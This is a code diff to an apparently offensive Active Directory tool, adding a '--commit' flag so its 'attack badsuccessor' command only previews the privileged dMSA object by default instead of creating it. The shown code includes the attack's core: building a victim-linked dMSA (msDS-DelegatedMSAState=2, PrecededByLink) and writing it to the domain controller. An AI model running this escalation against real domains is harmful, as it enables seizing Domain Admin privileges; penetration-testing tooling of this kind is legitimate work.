@@ -27,6 +27,11 @@ pub(crate) struct BadsuccessorArgs {
     /// sAMAccountName of the account to succeed (typically a Domain Admin).
     #[arg(long)]
     pub target: String,
+    /// **Arm the write.** `badsuccessor` PREVIEWS by default: it prints the dMSA object it would
+    /// create (a privileged, victim-linked object on the DC) and returns without writing. Pass
+    /// `--commit` to actually create it.
+    #[arg(long)]
+    pub commit: bool,
 }
 
 /// `attack badsuccessor` — Akamai/Yuval Gordon 2025 dMSA escalation. Any principal that can
@@ -101,6 +106,17 @@ pub(crate) async fn badsuccessor(mut a: BadsuccessorArgs) -> Result<()> {
             vec![victim_dn.as_bytes().to_vec()],
         ),
     ];
+
+    // Preview by default — this creates a privileged, victim-linked object on the DC.
+    if !a.commit {
+        crate::ui::note("preview only — no object created. Re-run with --commit to write.");
+        println!(
+            "[dry-run] would create dMSA {dn} \
+             (msDS-DelegatedMSAState=2, PrecededByLink → {victim_dn})"
+        );
+        return Ok(());
+    }
+
     c.add_object(&dn, attrs).await?;
     println!("[+] created dMSA {dn}");
     println!(
